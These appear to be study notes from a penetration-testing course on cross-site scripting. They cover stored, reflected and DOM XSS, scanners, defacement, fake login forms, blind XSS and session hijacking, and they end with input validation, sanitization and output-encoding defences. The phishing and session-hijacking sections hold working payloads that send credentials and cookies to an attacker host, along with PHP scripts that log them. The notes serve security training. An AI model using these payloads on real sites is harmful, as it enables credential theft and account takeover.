# Cross-Site Scripting (XSS)

## Introduction

JavaScript injected into a page via unsanitized input, executing in the victim's browser. Client-side only, same-origin limited. Three types: Stored, Reflected, DOM-based.

## Stored XSS

Payload stored in the back-end database and served on every page load. Most critical type, persists across refreshes, affects every visitor.

`window.origin` in the alert confirms which frame executed the payload, useful when cross-domain iframes are in play.

```html
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>
```

`<plaintext>` and `print()` are fallback payloads when `alert()` is blocked by the browser.

Refresh the page afterward; the alert firing again confirms the payload is stored (persistent).

## Reflected XSS

Input reflected by the back-end without storage. Non-persistent, executes once per request.

```text
http://<TARGET_IP>:<PORT>/index.php?task=<script>alert(window.origin)</script>
```

Check the Network tab to confirm GET vs POST. GET requests put the payload in the URL, making it shareable as a link to target a victim.

## DOM XSS

Processed entirely client-side via JS writing to the DOM. Input never reaches the back-end, non-persistent, and absent from view-source (visible only via the Web Inspector).

### Source & Sink

Source is the JS object holding user input (URL param, input field). Sink is the function writing it to the DOM; an unsanitized sink is vulnerable.

Sink functions: `document.write()` | `DOM.innerHTML` | `DOM.outerHTML` (JS), `add()` | `after()` | `append()` (jQuery)

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

### DOM Attacks

`innerHTML` strips `<script>` tags. Use event-handler based payloads instead.

```html
<img src="" onerror=alert(window.origin)>
```

```text
http://<TARGET_IP>:<PORT>/#task=<img src='' onerror=alert(window.origin)>
```

The `#` param is a URL fragment, processed client-side only and never sent to the server.

## XSS Discovery

Detected via automated scanners or manual payload testing/code review.

### Automated Discovery

Passive scan reviews client-side code for DOM XSS. Active scan injects payloads to trigger stored/reflected XSS.

```bash
git clone https://github.com/s0md3v/XSStrike.git
pip install -r requirements.txt
python xsstrike.py -u "http://<TARGET_IP>:<PORT>/index.php?task=test" # test a parameter
```

Also: Brute XSS, XSSer

### Manual Discovery

Difficulty depends on the target's security. Basic XSS is found via payload testing, advanced XSS needs code review.

#### XSS Payloads

Payload lists: PayloadAllTheThings, Payload-Box. XSS can be injected via HTTP headers (Cookie, User-Agent) when their values are reflected on the page, not only input fields.

## Defacing

Injected JS changes the page's look for every visitor. Common attack with stored XSS to claim a hack.

### Defacement Elements

`document.body.style.background` bg color | `document.body.background` bg image | `document.title` page title | `innerHTML` page text

### Changing Background

Use a solid color or an image URL.

```html
<script>document.body.style.background = "<COLOR>"</script>
<script>document.body.background = "<URL>"</script>
```

### Changing Page Title

```html
<script>document.title = '<TITLE>'</script>
```

### Changing Page Text

Target a specific element or overwrite the whole body.

```javascript
document.getElementById("<ELEMENT_ID>").innerHTML = "<TEXT>"
$("#<ELEMENT_ID>").html('<TEXT>');
document.getElementsByTagName('body')[0].innerHTML = "<TEXT>"
```

jQuery functions require the library imported in the page. The injected script appears in the source wherever it executes, so later page elements can render after it.

## Phishing

Injects a fake login form via XSS that posts credentials to an attacker-controlled server.

### Login Form Injection

Form `action` posts credentials to the attacker's server as GET parameters.

```html
<h3>Please login to continue</h3>
<form action=http://<ATTACKER_IP>>
<input type="username" name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password">
<input type="submit" name="submit" value="Login">
</form>
```

```javascript
document.write('<h3>Please login to continue</h3><form action=http://<ATTACKER_IP>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

### Cleaning Up

Remove the original form so the fake login looks legitimate.

```javascript
document.getElementById('<ELEMENT_ID>').remove();
```

Append an HTML opening comment `<!--` after the full payload to hide any leftover original markup.

### Credential Stealing

```bash
sudo nc -lvnp 80
```

Plain netcat mishandles the HTTP request, so the victim sees a connection error. Use a PHP listener for a clean redirect instead.

```bash
sudo php -S 0.0.0.0:80
```

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://<TARGET_IP>/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

## Session Hijacking

Steal a victim's session cookie via XSS and replay it to hijack their logged-in session (aka Cookie Stealing).

### Blind XSS Detection

XSS triggered on a page the attacker can't view (e.g. an admin panel). Detect via an out-of-band callback instead of an alert box.

Likely blind-vulnerable fields: Contact Forms, Reviews, User Details, Support Tickets, `User-Agent` header

Skip fields with strict format validation (email) or hashed values (password); not exploitable or not visible in cleartext.

### Loading a Remote Script

Name the remote script after the field under test, so the callback identifies which field is vulnerable.

```html
<script src="http://<ATTACKER_IP>/<FIELD_NAME>"></script>
<script src=http://<ATTACKER_IP>></script>
'><script src=http://<ATTACKER_IP>></script>
"><script src=http://<ATTACKER_IP>></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://<ATTACKER_IP>\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//<ATTACKER_IP>");a.send();</script>
<script>$.getScript("http://<ATTACKER_IP>")</script>
```

```bash
sudo php -S 0.0.0.0:80
```

### Session Hijacking

```javascript
document.location='http://<ATTACKER_IP>/index.php?c='+document.cookie;
new Image().src='http://<ATTACKER_IP>/index.php?c='+document.cookie;
```

`Image().src` is preferred over `document.location`; it loads unnoticed instead of navigating away.

```html
<script src=http://<ATTACKER_IP>/script.js></script>
```

```javascript
new Image().src='http://<ATTACKER_IP>/index.php?c='+document.cookie
```

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Reuse: in Firefox, open the Storage tab (Shift+F9), add the stolen cookie's Name/Value, refresh to authenticate as the victim.

## XSS Prevention

Secure the Source (input) and Sink (output) via sanitization and validation, on both front-end and back-end.

### Front-end

#### Input Validation

```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

#### Input Sanitization

```html
<script type="text/javascript" src="dist/purify.min.js"></script>
```

```javascript
let clean = DOMPurify.sanitize( dirty );
```

#### Direct Input

Never place user input directly in these contexts or pass it to these sinks.

`<script>` JS code | `<style>` CSS code | `<div name='INPUT'>` tag/attribute fields | `<!-- -->` HTML comments

Unsafe JS sinks: `innerHTML` | `outerHTML` | `document.write()` | `document.writeln()` | `document.domain`

Unsafe jQuery sinks: `html()` | `parseHTML()` | `add()` | `append()` | `prepend()` | `after()` | `insertAfter()` | `before()` | `insertBefore()` | `replaceAll()` | `replaceWith()`

### Back-end

#### Input Validation

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```

#### Input Sanitization

Front-end sanitization alone is bypassable via custom GET/POST requests; back-end sanitization is required.

```php
addslashes($_GET['email'])
```

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

#### Output HTML Encoding

Encodes special characters to HTML entities (`<` to `&lt;`) so full input can display safely without executing.

```php
htmlentities($_GET['email']);
```

`htmlspecialchars()` also usable.

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```